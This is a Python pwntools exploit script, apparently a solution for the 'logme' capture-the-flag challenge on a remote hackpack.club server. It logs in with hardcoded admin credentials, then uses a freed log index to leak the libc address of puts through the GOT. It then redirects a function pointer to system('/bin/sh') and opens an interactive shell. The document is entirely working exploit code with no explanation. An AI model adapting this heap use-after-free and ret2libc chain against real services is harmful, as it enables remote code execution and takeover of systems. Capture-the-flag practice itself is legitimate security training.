from pwn import *

#p = process("./logme",env = {"LD_PRELOAD" : "./libc-de.so"})
p = remote("ctf2021.hackpack.club", 11002)
elf = ELF("./logme")
#libc = ELF("./libc-2.27.so")
libc = ELF("./libc-de.so")
#gdb.attach(p)
admin = "administrator"
pwd = "S3CreTB4CkD0or"

def auth():
	p.sendlineafter(">","1")
	p.sendafter("Username",admin)
	p.sendafter("Password",pwd)
	return

def createIndex(name):
	p.sendlineafter(">","1")
	p.sendafter("name:",name)
	return

def deleteIndex(idx):
	p.sendlineafter(">","2")
	p.sendlineafter("Index:",idx)
	return

def dumpLog(idx):
	p.sendlineafter(">","3")
	p.sendlineafter("Index:",idx)
	return

def logOff():
	p.sendlineafter(">","4")
	return

def addEntry(idx,size,data):
	p.sendlineafter(">","2")
	p.sendlineafter("Index:",idx)
	p.sendlineafter("Size",size)
	p.sendafter("Entry",data)
	return

#gdb.attach(p)
auth()
createIndex("namnp0")
createIndex("namnp1")
deleteIndex("0")

logOff()

#user session
payload = b"A"*0x28
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
addEntry("1",str(0x38),payload)

#new session
auth()
dumpLog("0")
leak = p.recvuntil('\x7f')[-6:]
print(leak)
puts = u64(leak.ljust(8,b'\x00'))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
print("puts : " + hex(puts))
print("libc_base : " + hex(libc_base))
logOff()

#user session
payload = b"A"*0x28
payload += p64(binsh)
payload += p64(system)
addEntry("1",str(0x38),payload)

#admin session
auth()
dumpLog("0")

p.interactive()